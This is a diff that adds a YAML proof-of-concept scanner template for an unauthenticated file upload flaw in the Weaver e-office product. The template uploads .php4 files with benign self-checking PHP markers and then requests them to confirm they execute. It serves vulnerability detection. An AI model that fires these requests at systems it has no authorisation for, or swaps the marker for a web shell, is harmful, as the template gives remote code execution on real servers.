@@ -1,0 +1,63 @@
+name: yaml-poc-weaver-weaver_e_office-file_upload-CT-596718
+binding: 88a7e26b-9d2c-4b76-9925-3085c8cfaddf
+detail:
+    author: lei_sec
+    links:
+        - https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125638
+    vulnerability:
+        id: b377326d-71f9-4204-9802-85d5b50be6a6
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    r1: randomLowercase(4)
+    r2: randomInt(40000, 44800)
+    r3: randomLowercase(20)
+    r4: randomLowercase(20)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /webservice/upload/upload.php
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php4\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5({{r2}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+        expression: response.status == 200
+        output:
+            search: '"(?P<path>.+)".bsubmatch(response.body)'
+            path: replaceAll(search["path"], "*", "/")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /attachment/{{path}}
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r2))))
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /webservice/upload.php
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: |-
+                ------WebKitFormBoundary{{rboundary}}
+                Content-Disposition: form-data; name="file"; filename="{{r3}}.php4."
+                Content-Type: application/octet-stream
+
+                <?php echo "{{r4}}";?>
+                ------WebKitFormBoundary{{rboundary}}--
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(r3))
+        output:
+            search: '"(?P<number>\\d+)\\*.*\\.php4.".bsubmatch(response.body)'
+            path: search["number"]
+    r3:
+        request:
+            cache: true
+            method: GET
+            path: /attachment/{{path}}/{{r3}}.php4
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(r4))
+expression: (r0() && r1()) || (r2() && r3())
